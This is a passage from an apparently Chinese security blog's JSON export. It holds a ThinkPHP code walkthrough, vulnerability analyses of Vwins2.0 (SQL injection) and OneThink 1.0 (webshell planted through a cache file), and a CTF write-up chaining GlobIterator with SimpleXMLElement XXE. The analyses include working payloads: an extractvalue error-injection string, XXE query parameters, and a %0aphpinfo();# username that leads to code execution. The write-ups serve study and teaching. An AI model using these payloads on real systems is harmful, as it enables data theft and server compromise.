&#125;else&#123; E(L('_ERROR_ACTION_').':'.ACTION_NAME); &#125; $module = new $class; // 操作绑定到类后 固定执行run入口 $action = 'run'; &#125;else&#123; //创建控制器实例 $module = controller(CONTROLLER_NAME,CONTROLLER_PATH); &#125; if(!$module) &#123; if('4e5e5d7364f443e28fbf0d3ae744a59a' == CONTROLLER_NAME) &#123; header(\"Content-type:image/png\"); exit(base64_decode(App::logo())); &#125; // 是否定义Empty控制器 $module = A('Empty'); if(!$module)&#123; E(L('_CONTROLLER_NOT_EXIST_').':'.CONTROLLER_NAME); &#125; &#125; // 获取当前操作名 支持动态路由 if(!isset($action))&#123; $action = ACTION_NAME.C('ACTION_SUFFIX'); &#125; try&#123; self::invokeAction($module,$action); &#125; catch (\\ReflectionException $e) &#123; // 方法调用发生异常后 引导到__call方法处理 $method = new \\ReflectionMethod($module,'__call'); $method-&gt;invokeArgs($module,array($action,'')); &#125; return ; &#125; 对传入的控制器进行安全检查 判断是否有ACTION_BIND_CLASS配置 调用controller方法创建控制器实例 如果为空控制器，则显示Logo 如果没有动作的话，取出默认动作 最后调用invokeAction执行$module类中的$action方法（此处利用了php的反射机制） 到这里基本整个TP框架的初始化就完成了，接下来就是去依次根据路由执行各个控制器的方法 总结在之前分析一些框架的时候，函数老是跳来跳去的，就把自己跟乱了，这次分析一边TP框架，每个框架都有他们相同的地方，现在大多数框架都是MVC模式，这些框架中的一般都会有URL调度，错误异常处理，DEBUG模式，缓存加载等通用的技术，可能实现的语言不同，但是逻辑和原理并不会差太多。 基本TP框架的流程可以大体上分为三个： TP框架核心文件的加载和配置 应用核心文件的加载与配置 应用开始运行","categories":[],"tags":[{"name":"tp","slug":"tp","permalink":"http://yoursite.com/tags/tp/"},{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"Vwins2.0 SQL注入漏洞分析","slug":"Vwins2.0 SQL注入漏洞分析","date":"2018-07-30T08:16:44.644Z","updated":"2018-08-01T15:36:32.332Z","comments":true,"path":"2018/07/30/Vwins2.0 SQL注入漏洞分析/","link":"","permalink":"http://yoursite.com/2018/07/30/Vwins2.0 SQL注入漏洞分析/","excerpt":"","text":"0x01 漏洞利用条件后台管理员开放注册 0x02 漏洞利用 注入点在用户名处 我们构造payload:flight&#39; and extractvalue(1,(select user()))# 可以看到我们成功执行了payload，因为前端有跳转，所以我们使用burp抓包来进行攻击 0x02 漏洞分析Vwins2.0是用CI框架搭建的，在入口文件处有着全局的过滤函数，在include config.php的时候也同时include了全局过滤类safe.php 我们看一下safe.php中的过滤 可以看到过滤了很多函数，但是好像报错函数并没有被过滤 在_construct函数中调用了本类的init()方法，我们看一下都对哪里传来的参数进行了过滤 对来自GET,POST,COOKIE,referer的信息进行了过滤 本次注入漏洞的利用点在注册用户处，因为全局过滤函数的并没有考虑到报错注入的问题，导致了漏洞的发生 根据路由我们可以定位到进行注册的函数 函数获取到post传入的username（注意:username在最开始就已经被过滤一次了，而且还过滤了一次xss，但是不影响sql执行），将其存在$_arr[&#39;username&#39;]中，我们继续跟踪username，发现在117行调用了了ddb的get_total方法，跟踪这个方法 发现在94行进行了sql的拼接，进入where_preg 最后拼接后的sql语句为：SELECT COUNT(*) AS num FROM es_users WHERE &#39;username&#39; = &#39;flight&#39; 因为union select被过滤，我们可以使用extractvalue来报错注入，即可构造payload：flight&#39; and extractvalue(1,(select user()))#","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://yoursite.com/tags/漏洞分析/"},{"name":"ci","slug":"ci","permalink":"http://yoursite.com/tags/ci/"}]},{"title":"实例化漏洞和XXE","slug":"实例化任意对象漏洞","date":"2018-07-28T06:32:05.186Z","updated":"2018-07-29T03:33:57.686Z","comments":true,"path":"2018/07/28/实例化任意对象漏洞/","link":"","permalink":"http://yoursite.com/2018/07/28/实例化任意对象漏洞/","excerpt":"","text":"一道实例化漏洞和XXE结合的题题目源码1234567891011121314151617181920212223//index.php&lt;?phpshow_source(__FILE__);class NotFound&#123; function __construct() &#123; die('404'); &#125;&#125;spl_autoload_register( function ($class)&#123; new NotFound(); &#125;);$classname = isset($_GET['name']) ? $_GET['name'] : null;$param = isset($_GET['param']) ? $_GET['param'] : null;$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.'=&gt;'.$value.'&lt;br&gt;';&#125; 1234//flag13Here.php&lt;?php$flag = \"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;\";?&gt; 解法分析先看可控的点： 有三个get参数的点可以控制，分别是$classname,$param,$param2 再往后看，$classname可以让我们实例化一个类，这个类是我们可控的，而且可以控制该类构造方法的前两个参数 这个地方很容易想到PHP的内置类：SimpleXMLElement，可以进行xxe攻击，但是我们现在不知道flag文件的名字，这个时候可以用PHP中的另外一个内置类：GlobIterator，可以列出来所有匹配的文件名（这个类有点像glob://协议）： 根据文档，很容易理解GlobIterator类的构造方式，而第二个参数控制的是输出的键值，可以选择0，所以构造payload： ?name=GlobIterator&amp;param1=./*.php&amp;param2=0 发现成功读出当前目录的文件 现在已经知道了flag的文件名，那么我们可以构造SimpleXMLElement类来进行XXE来读取flag文件的内容 先看一下SimpleXMLElement的构造方法 第一个参数可以是XML的文件路径，可以是XML文件内容，也可以是URL（需要第三个参数为true） 第二个参数为系统预定义的常量，具体的意义如下： 为了避免一些特殊字符的错误，我们将结果进行base64编码： 构造payload为：name=SimpleXMLElement&amp;param=/Library/WebServer/Documents/PhpProjects/CTF_php/flag13Here.php&amp;param2=2 即可读取到结果：","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://yoursite.com/tags/漏洞分析/"},{"name":"安全技术","slug":"安全技术","permalink":"http://yoursite.com/tags/安全技术/"}]},{"title":"OneThink CMS的缓存漏洞的分析","slug":"OneThink CMS的缓存漏洞的分析","date":"2018-07-27T14:50:39.716Z","updated":"2018-07-28T12:15:29.088Z","comments":true,"path":"2018/07/27/OneThink CMS的缓存漏洞的分析/","link":"","permalink":"http://yoursite.com/2018/07/27/OneThink CMS的缓存漏洞的分析/","excerpt":"","text":"第一次分析漏洞，跟着其他师傅的分析过程自己走了一遍，有的地方不太懂也查清楚了，写一遍加深记忆吧 0x01 漏洞利用条件 OneThink1.0 并且/Temp/Runtime目录可读可写 0x02 漏洞分析因为TP对缓存设计逻辑的漏洞，以及缓存文件名可猜测的原因，导致了这个漏洞 先看一下TP的缓存文件的配置： TP中一些系统常量的定义都在ThinkPHP/ThinkPHP.php中定义，缓存路径也在这里： 可以看到其中的TEMP_PATH默认值为Runtime/Temp目录 而缓存文件存储的位置在ThinkPHP/Conf/convention.php 我们开始从登陆开始一步步分析OneThink在登陆的时候缓存文件是如何存储的： 在抓包以后，我们发现请求的地址为/home/user/login.html，那么跟踪这个请求，我们可以定位到Home模块的UserController控制器中的login方法： 其中在登陆成功以后调用了$Member中的login方法，传入的$uid是从数据库中查询出来的用户名对应的用户id 其中的D函数是TP中获取model的方法，这里相当于获得了一个MemberModel类的实例，我们进入MemberModel中查看一下其中的login函数 其中的$user是从$uid中拿到的，也就是用户名 在登陆用户的时候调用了autoLogin函数，进入这个函数里面查看 里面调用了get_username函数，继续跟入 终于找到了对于用户名的缓存操作 在第一次登陆的时候是没有缓存的，if条件应该直接进入else部分，又因为$list是从$uid所在行的第二行拿到的，所以应该是用户名，所以在下面调用S方法缓存数据的时候传入的$list我们是可控的 再进入S函数，查看一下这个函数的具体设计 我们传入的$list就是S函数中的value参数，分析if条件的话可以知道程序直接进入第二个elseif，初始化$cache，关键在最后的set函数，set函数中的$value仍然是我们可控的，进入set函数中，set函数在ThinkPHP/Library/Think/Cache/Driver/File.class.php 发现$filename被file_put_contents直接调用，如果不开启数据压缩的话，$data则是我们控制的$value序列化以后存入的值 现在我们可以控制文件中的一部分内容，知道了文件存储的目录，如果我们知道文件名就好了，那么我们进入filename函数里面看一下缓存文件的文件名是怎么定义的 因为一般没有开启DATA_CACHE_SUBDIR，所以判断直接跳到else部分，而options[‘prefix’]是空的，所以最后的文件名为md5($name).php 现在我们构造payload： 用户名注册为%0aphpinfo();#这样在存储缓存文件的时候就可以写入webshell，#注释了序列化的剩余部分，前面的%0a的作用则是为了不让$data中&lt;?php\\n//&quot;.sprintf(&#39;%012d&#39;,$expire).$check.$data.&quot;\\n?&gt;的’//‘注释攻击代码 0x03 漏洞利用在OneThink的注册页面中的注册用户名为:%0aphpinfo();#，并且用burp抓包将%0a解码 之后用这个用户名登陆，同样抓包将%0a解码，之后访问Temp/Runtime/用户名md5.php，即可发现phpinfo得以执行 查看缓存文件的内容，可以发现payload的原理： 0x04 总结这是第一次这么系统的分析一个漏洞，可以说学到了很多，最近也在学TP框架，正好也是一个巩固和提高，虽然是跟着别人的路走的，但是仍然很艰难，可能是第一次分析漏洞吧，这是第一次，但不是最后一次，希望下次能更游刃有余吧","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://yoursite.com/tags/漏洞分析/"},{"name":"tp","slug":"tp","permalink":"http://yoursite.com/tags/tp/"}]}]}